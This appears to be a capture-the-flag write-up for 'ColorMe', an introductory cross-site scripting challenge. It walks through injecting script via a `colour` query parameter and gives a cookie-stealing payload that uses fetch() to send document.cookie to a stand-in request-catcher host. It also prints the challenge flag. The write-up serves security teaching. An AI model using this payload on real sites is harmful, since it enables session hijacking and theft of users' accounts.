# ColorMe Solution

"ColorMe" is the first challenge in the 3-part XSS series. It's meant to be a straightforward introduction into the world of cross-site scripting. 

If you checked out the accompanying guide, the first page or so is really all you need to take a stab at this challenge. Observe that the color that you can choose to change the headline is specified by a query parameter called `colour`:

You can freely control this value in the URL. Try out a few different inputs, like other colors, or maybe plain nonsense and see what comes up! 

Notice anything in the source code? Take a look by right-clicking->inspect element and see what happens to your input.

```html
<script>
nospace = "${colour}".replace(" ", '');
for (let i = 0; i < document.getElementsByTagName('h1').length; i++) {
  document.getElementsByTagName('h1')[i].style.color = nospace;
}
</script>
```

Interesting stuff! The key piece of information here is that your input is directly fed into the HTML skeleton of this webpage. That means you can add your own HTML tags and it will be rendered accordingly. 

So with that being said, to achieve proper XSS, try adding an HTML `script` tag, and see if it executes with a simple line of JS code like the `alert()` function. Try out something like `?colour=<script>alert(1);</script>`, and then see what happens with `?colour=<script>alert(document.cookie)</script>`.

Great! So now we have an XSS attack vector. What now? If you look at the guide, remember that you can use XSS attacks to steal a user's cookies. This can be done by first having a server that you control to act as your webhook or request catcher. There are a lot of these kinds of resources online, but the one that we like to use is webhook.site (but any sort of request catcher will do!).

Now we will do a little bit of JavaScript and browser manipulation. From the guide, we will use a payload such as:

```js
fetch('your.serverhere?cookie='%2B(document.cookie));
```

And add that as the value to the query parameter.

```
?colour=<script>fetch('your.serverhere?cookie='%2B(document.cookie));</script>
```

When the page reloads, take a look at your request catcher and observe that a new request has been caught - it's you, when you reloaded the page. If there are any cookies you have, it'll be listed there too! All that's left is to report the XSS colour URL to the admin, and wait for them to visit. 

```
maple{0ops_i_f0rgot_about_xss}
```